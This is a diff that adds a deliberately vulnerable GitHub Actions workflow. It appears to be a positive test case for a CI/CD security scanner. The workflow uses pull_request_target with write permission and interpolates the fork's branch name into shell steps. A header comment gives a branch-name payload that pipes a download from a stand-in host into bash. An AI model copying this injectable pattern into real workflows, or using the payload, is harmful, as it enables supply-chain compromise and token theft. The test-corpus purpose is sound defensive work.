@@ -1,0 +1,26 @@
+# corpus: positive
+# models: the Ultralytics shape (Dec 2024) -- pull_request_target interpolates
+#   the fork's branch name (github.head_ref) into a shell; a branch named
+#   `$({curl,-sSfL,evil.sh}|bash)` executes with the base repo's token/cache.
+# expect: cicd-sec-4-ppe-shell-injection
+name: Format check
+
+on:
+  pull_request_target:
+    branches: [main]
+
+jobs:
+  format:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.head_ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+      - name: Commit formatting
+        run: |
+          git checkout ${{ github.head_ref }}
+          black .
+          git commit -am "style: format" && git push origin ${{ github.head_ref }}
